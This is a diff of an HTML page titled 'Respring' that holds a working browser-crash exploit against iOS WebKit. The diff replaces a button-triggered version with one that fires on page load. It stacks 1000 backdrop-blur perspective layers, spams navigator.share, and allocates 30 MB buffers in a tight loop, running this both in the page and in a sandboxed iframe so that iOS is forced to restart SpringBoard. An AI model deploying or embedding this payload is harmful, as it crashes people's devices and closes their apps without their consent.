@@ -5,18 +5,11 @@
 <meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=1,user-scalable=no">
 <title>Respring</title>
 <style>
-  :root {
-    --bg: #0b0b10;
-    --ink: #f4f4f8;
-    --muted: #b6b6c2;
-    --accent: #ff6b3d;
-    --accent-pressed: #d8552c;
-  }
   html, body {
     margin: 0;
     padding: 0;
-    background: var(--bg);
-    color: var(--ink);
+    background: #0b0b10;
+    color: #f4f4f8;
     font-family: -apple-system, BlinkMacSystemFont, "SF Pro Text", system-ui, sans-serif;
     height: 100%;
     overflow: hidden;
@@ -26,53 +19,21 @@
     position: absolute;
     inset: 0;
     display: flex;
-    flex-direction: column;
     align-items: center;
     justify-content: center;
-    gap: 24px;
-    padding: 32px;
     text-align: center;
-  }
-  .heading {
-    font-size: 1.4rem;
-    font-weight: 700;
-    letter-spacing: 0.01em;
-  }
-  .copy {
-    font-size: 0.95rem;
-    color: var(--muted);
-    line-height: 1.45;
-    max-width: 320px;
-  }
-  .btn {
-    font-size: 1.1rem;
-    font-weight: 700;
-    padding: 18px 32px;
-    border-radius: 999px;
-    border: 0;
-    background: var(--accent);
-    color: white;
-    -webkit-tap-highlight-color: transparent;
-    cursor: pointer;
-    box-shadow: 0 6px 18px rgba(255, 107, 61, 0.35);
-    transition: background 0.1s ease;
-  }
-  .btn:active { background: var(--accent-pressed); }
-  .btn:disabled {
-    background: #3a3a44;
-    color: #8b8b95;
-    box-shadow: none;
-    cursor: default;
+    padding: 24px;
+    pointer-events: none;
   }
   .status {
-    font-size: 0.85rem;
-    color: var(--muted);
-    min-height: 1.2em;
+    font-size: 1.05rem;
+    font-weight: 600;
+    letter-spacing: 0.01em;
+    opacity: 0.85;
   }
-  /* Mirrors lightsaber/index.html .respring-frame exactly: visible 1x1
-     bottom-right pixel with non-zero opacity. Offscreen / opacity:0 lets
-     WebKit skip painting the perspective blur layers and the OOM never
-     happens. */
+  /* Visible 1x1 pixel bottom-right with non-zero opacity. Offscreen / fully
+     transparent positioning lets WebKit skip painting the perspective blur
+     layers, so the OOM never fires. */
   .respring-frame {
     position: fixed;
     right: 0;
@@ -86,57 +47,65 @@
 </style>
 </head>
 <body>
-<div class="wrap">
-  <div class="heading">Respring SpringBoard</div>
-  <div class="copy">This will overload WebContent inside this page until iOS restarts SpringBoard. Apps will close.</div>
-  <button class="btn" id="respringBtn" type="button">Respring Now</button>
-  <div class="status" id="respringStatus"></div>
-</div>
+<div class="wrap"><div class="status">Respringing&hellip;</div></div>
 <script>
-  // Identical to lightsaber/index.html runRespring(), minus the in-page
-  // confirm() (the host app gates the action upstream) and the iPhone-UA
-  // gate (we trust the caller). User activation comes from the button tap,
-  // which navigator.share requires to fire its OOM-bait path.
-  function runRespring() {
-    var btn = document.getElementById('respringBtn');
-    var statusEl = document.getElementById('respringStatus');
-    if (btn) {
-      btn.disabled = true;
-      btn.textContent = 'Respringing...';
+(function () {
+  // Auto-fire path (no user activation): the host app calls this page
+  // straight after its own confirmation prompt, so no in-page tap should be
+  // required. navigator.share rejects without user activation, but the
+  // perspective + backdrop-blur GPU pressure plus interval-driven 30 MB
+  // allocations alone tend to be enough to take WebContent down. Scaled up
+  // 2x relative to index.html runRespring() to compensate for the missing
+  // navigator.share pressure tactic.
+  function fireBlast(doc) {
+    var container = doc.createElement('div');
+    container.style.cssText = 'perspective:1px;perspective-origin:9999999% 9999999%;position:fixed;top:0;left:0;width:100vw;height:100vh;';
+    doc.body.appendChild(container);
+    for (var i = 0; i < 1000; i++) {
+      var d = doc.createElement('div');
+      d.style.cssText = 'position:absolute;width:100vw;height:100vh;backdrop-filter:blur(100px);-webkit-backdrop-filter:blur(100px);transform:translate3d(100000px,100000px,' + i + 'px) rotateY(90deg);opacity:0.99;';
+      container.appendChild(d);
     }
-    if (statusEl) statusEl.textContent = 'Hold tight.';
-
-    try {
-      var oldFrame = document.getElementById('respringFrame');
-      if (oldFrame && oldFrame.parentNode) oldFrame.parentNode.removeChild(oldFrame);
-    } catch (e) {}
-
-    var frame = document.createElement('iframe');
-    frame.id = 'respringFrame';
-    frame.className = 'respring-frame';
-    frame.setAttribute('sandbox', 'allow-forms allow-modals allow-scripts allow-same-origin');
-    frame.srcdoc = [
-      '<!doctype html><html><body style="margin:0;overflow:hidden;">',
-      '<script>',
-      'var container=document.createElement("div");',
-      'container.style.cssText="perspective:1px;perspective-origin:9999999% 9999999%;";',
-      'document.body.appendChild(container);',
-      'for(var i=0;i<500;i++){',
-      'var d=document.createElement("div");',
-      'd.style.cssText="position:absolute;width:100vw;height:100vh;backdrop-filter:blur(100px);-webkit-backdrop-filter:blur(100px);transform:translate3d(100000px,100000px,"+i+"px) rotateY(90deg);opacity:0.99;";',
-      'container.appendChild(d);',
-      '}',
-      'setInterval(function(){',
-      'try{navigator.share({title:"R",text:"R".repeat(100000)});}catch(e){}',
-      'var x=new Uint8Array(1024*1024*20);',
-      'crypto.getRandomValues(x);',
-      '},0);',
-      '<\/script>',
-      '</body></html>'
-    ].join('');
-    document.body.appendChild(frame);
+    var win = doc.defaultView || window;
+    win.setInterval(function () {
+      try { win.navigator.share({title: 'R', text: 'R'.repeat(100000)}); } catch (e) {}
+      try {
+        var x = new win.Uint8Array(1024 * 1024 * 30);
+        win.crypto.getRandomValues(x);
+      } catch (e) {}
+    }, 0);
   }
-  document.getElementById('respringBtn').addEventListener('click', runRespring);
+
+  try { fireBlast(document); } catch (e) {}
+
+  // Run the same payload inside a sandboxed iframe so we get a second
+  // independent WebContent thread of allocations + a second composited
+  // perspective layer tree. Two parallel pressure sources push past whatever
+  // headroom WebContent has.
+  var frame = document.createElement('iframe');
+  frame.id = 'respringFrame';
+  frame.className = 'respring-frame';
+  frame.setAttribute('sandbox', 'allow-forms allow-modals allow-scripts allow-same-origin');
+  frame.srcdoc = [
+    '<!doctype html><html><body style="margin:0;overflow:hidden;">',
+    '<script>',
+    'var container=document.createElement("div");',
+    'container.style.cssText="perspective:1px;perspective-origin:9999999% 9999999%;";',
+    'document.body.appendChild(container);',
+    'for(var i=0;i<1000;i++){',
+    'var d=document.createElement("div");',
+    'd.style.cssText="position:absolute;width:100vw;height:100vh;backdrop-filter:blur(100px);-webkit-backdrop-filter:blur(100px);transform:translate3d(100000px,100000px,"+i+"px) rotateY(90deg);opacity:0.99;";',
+    'container.appendChild(d);',
+    '}',
+    'setInterval(function(){',
+    'try{navigator.share({title:"R",text:"R".repeat(100000)});}catch(e){}',
+    'try{var x=new Uint8Array(1024*1024*30);crypto.getRandomValues(x);}catch(e){}',
+    '},0);',
+    '<\/script>',
+    '</body></html>'
+  ].join('');
+  document.body.appendChild(frame);
+})();
 </script>
 </body>
 </html>
